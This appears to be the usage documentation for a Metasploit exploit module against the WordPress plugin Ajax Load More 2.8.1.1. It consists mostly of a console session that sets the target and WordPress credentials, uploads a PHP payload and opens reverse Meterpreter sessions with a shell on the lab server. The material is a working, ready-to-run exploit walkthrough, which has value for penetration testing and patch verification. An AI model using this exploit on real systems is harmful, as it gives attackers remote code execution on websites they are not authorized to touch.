#### Add WordPress Plugin Ajax Load More Auth File Upload Vulnerability

  Application: WordPress Plugin 'Ajax Load More' 2.8.1.1
  Homepage: https://wordpress.org/plugins/ajax-load-more/
  Source Code: https://downloads.wordpress.org/plugin/ajax-load-more.2.8.0.zip
  Active Installs (wordpress.org): 10,000+
  References: https://wpvulndb.com/vulnerabilities/8209

#### Vulnerable packages*
        
  2.8.1.1
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf>  use exploit/unix/webapp/wp_ajax_load_more_file_upload 
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  info

       Name: Wordpress Ajax Load More PHP Upload Vulnerability
     Module: exploit/unix/webapp/wp_ajax_load_more_file_upload
   Platform: PHP
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-10-10

Provided by:
  Unknown
  Roberto Soares Espreto <robertoespreto@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Ajax Load More 2.8.1.1

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                         yes       The target address
  RPORT        80               yes       The target port
  TARGETURI    /                yes       The base path to the wordpress application
  VHOST                         no        HTTP server virtual host
  WP_PASSWORD                   yes       Valid password for the provided username
  WP_USERNAME                   yes       A valid username

Payload information:

Description:
  This module exploits an arbitrary file upload in the WordPress Ajax 
  Load More version 2.8.1.1. It allows to upload arbitrary php files 
  and get remote code execution. This module has been tested 
  successfully on WordPress Ajax Load More 2.8.0 with Wordpress 4.1.3 
  on Ubuntu 12.04/14.04 Server.

References:
  https://wpvulndb.com/vulnerabilities/8209

msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  show options 

Module options (exploit/unix/webapp/wp_ajax_load_more_file_upload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port
   TARGETURI    /                yes       The base path to the wordpress application
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD                   yes       Valid password for the provided username
   WP_USERNAME                   yes       A valid username


Exploit target:

   Id  Name
   --  ----
   0   Ajax Load More 2.8.1.1


msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  set RHOST 192.168.0.14
RHOST => 192.168.0.14
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  set WP_USERNAME espreto
WP_USERNAME => espreto
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  set WP_PASSWORD P@ssW0rd
WP_PASSWORD => P@ssW0rd
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  check 
[*] 192.168.0.14:80 - The target appears to be vulnerable.
msfdevel 192.168.0.7 shell[s]:0 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  exploit 

[*] Started reverse handler on 192.168.0.7:4444 
[*] 192.168.0.14:80 - Uploading payload
[*] 192.168.0.14:80 - Calling uploaded file
[*] Sending stage (33068 bytes) to 192.168.0.14
[*] Meterpreter session 1 opened (192.168.0.7:4444 -> 192.168.0.14:42868) at 2015-10-17 13:21:05 -0300
[+] Deleted default.php

meterpreter > sysinfo 
Computer    : msfdevel
OS          : Linux msfdevel 3.13.0-62-generic #102~precise1-Ubuntu SMP Wed Aug 12 14:11:43 UTC 2015 i686
Meterpreter : php/php
meterpreter > shell
Process 12445 created.
Channel 0 created.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
^Z
Background channel 0? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
msfdevel 192.168.0.7 shell[s]:1 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  set VERBOSE true
VERBOSE => true
msfdevel 192.168.0.7 shell[s]:1 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  exploit 

[*] Started reverse handler on 192.168.0.7:4444 
[*] 192.168.0.14:80 - Trying to login as espreto
[*] 192.168.0.14:80 - Trying to get nonce
[*] 192.168.0.14:80 - Trying to upload payload
[*] 192.168.0.14:80 - Uploading payload
[*] 192.168.0.14:80 - Calling uploaded file
[*] Sending stage (33068 bytes) to 192.168.0.14
[*] Meterpreter session 2 opened (192.168.0.7:4444 -> 192.168.0.14:42935) at 2015-10-17 13:24:03 -0300
[+] Deleted default.php

meterpreter > background 
[*] Backgrounding session 2...
msfdevel 192.168.0.7 shell[s]:2 job[s]:0 msf> exploit(wp_ajax_load_more_file_upload)  
```
